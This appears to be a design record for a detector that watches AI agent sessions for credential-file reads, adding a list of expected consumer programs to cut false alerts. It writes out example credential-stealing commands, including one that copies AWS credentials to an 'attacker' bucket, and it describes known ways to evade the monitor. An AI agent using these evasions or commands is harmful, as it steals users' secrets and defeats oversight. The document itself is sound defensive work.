# ADR 0009: Expected consumers of credential files

Status: Accepted (2026-11-07)
Milestone: M1a (list format and enrichment); M2 (tuning from the benign corpus)
Related: routine credential reads by expected programs (`ssh` during `git push`, `npm` reading `~/.npmrc`) would flood AEDR-001; SPEC 11.4, 11.5 (AEDR-001, AEDR-005), 17.7

## Context

AEDR-001 alerts on any read of a credential file outside the workspace. Normal agent work
reads credential files constantly, through the tools that own them:

- `ssh` reads `~/.ssh/id_*` on every `git push` over SSH;
- `npm` reads `~/.npmrc` on every install;
- `aws`, `kubectl`, `docker`, `gh` and git's credential-store helper read theirs.

SPEC 11.5 lists these as false positives without a mitigation. The SPEC 17.7 target of at
most 1 alert per agent-hour is not reachable without one. The same reads would also arm
AEDR-005 (credential read then egress), turning every `git push` into a critical alert.

## Decision

1. A new packaged list `credential_consumers.yaml` maps credential path globs to expected
   consumer programs:

   ```yaml
   name: credential_consumers
   items:
     - path: "~/.ssh/id_*"
       exe: ["/usr/bin/ssh", "/usr/bin/ssh-add", "/usr/bin/ssh-keygen"]
     - path: "~/.npmrc"
       interpreted: [{exe: "/usr/bin/node", script: "*/npm/bin/npm-cli.js"}]
     - path: "~/.kube/config"
       exe: ["/usr/bin/kubectl", "/usr/local/bin/kubectl", "/usr/bin/helm"]
   ```

   - `exe` entries are matched against the process's executable as captured in-kernel: the
     `filename` of the last EXEC of that `(pid, start_ns)`, never `/proc/<pid>/exe` alone.
   - `interpreted` entries cover tools that are scripts: interpreter exe plus a glob on the
     script path from argv.
2. Enrichment adds `credential_consumer_ok: bool` to FILE_OPEN events whose path is in
   `credential_paths`. It is true when the reader matches an entry for that path, and the
   consumer executable:
   - lives in a system location (`/usr/bin`, `/usr/sbin`, `/bin`, `/usr/local/bin`,
     `/snap/bin`, `/opt/*/bin`), and
   - was not written or created during this session (checked against `written_paths`).
3. AEDR-001 adds `{field: credential_consumer_ok, equals: false}` to its `all:` clause.
4. Expected-consumer reads are recorded in session state as `consumer_credential_reads`.
   They do not arm AEDR-005 or the session taint (ADR 0007, M2). Only unexpected reads taint.
5. The agent's own credential store is handled by ADR 0008 (`harness_managed_paths`), not by
   this list, because the consumer there is the harness root itself.
6. The initial list is conservative and grows only from measured benign data (M2, M3).
   Every entry is documented in `docs/rules.md` with the reason.

## Alternatives considered

- **Exclude by `comm`.** `comm` is 15 characters and settable by the process with
  `prctl(PR_SET_NAME)`. Rejected.
- **Exclude by argv patterns only.** Trivially spoofed (`cat ~/.ssh/id_rsa # ssh`).
  Rejected.
- **Accept the noise and suppress per user.** Fails the FP target out of the box and trains
  users to ignore AEDR-001. Rejected.

## Consequences

- Consumer identity is path-based, so it can be impersonated. The documented evasion is to
  copy or link a reader (`cat`, `python3`) to a consumer name. The system-location and
  not-written-this-session conditions close the easy forms:
  - a file planted in `~/.local/bin/ssh` is not in a system location;
  - a file written during the session is excluded.
  The remaining gap is a user-writable `/opt/*/bin`, documented in `docs/limitations.md`.
  Hardlinks to system binaries keep the system path, so they are not an evasion.
- Interpreter-hosted consumers (npm, twine) are weaker: any script at a matching path
  qualifies. This is documented.
- Exfiltration through a legitimate consumer (for example `scp`-style misuse of `ssh`, or
  `aws s3 cp ~/.aws/credentials s3://attacker`) is not caught by AEDR-001. It is left to
  argv-aware and egress rules in M2 and listed as a limitation.

## Kernel-version notes

None.

## Tests

- Golden AEDR-001 near-misses: `ssh` reading `~/.ssh/id_ed25519` during a `git push`;
  `node npm-cli.js` reading `~/.npmrc`.
- Golden AEDR-001 true positives: `cat ~/.ssh/id_ed25519`; a binary written to `/tmp` this
  session named `ssh` reading the key; `python3 -c` reading `~/.npmrc`.
- Unit: list loading; interpreter and script matching; system-location check.
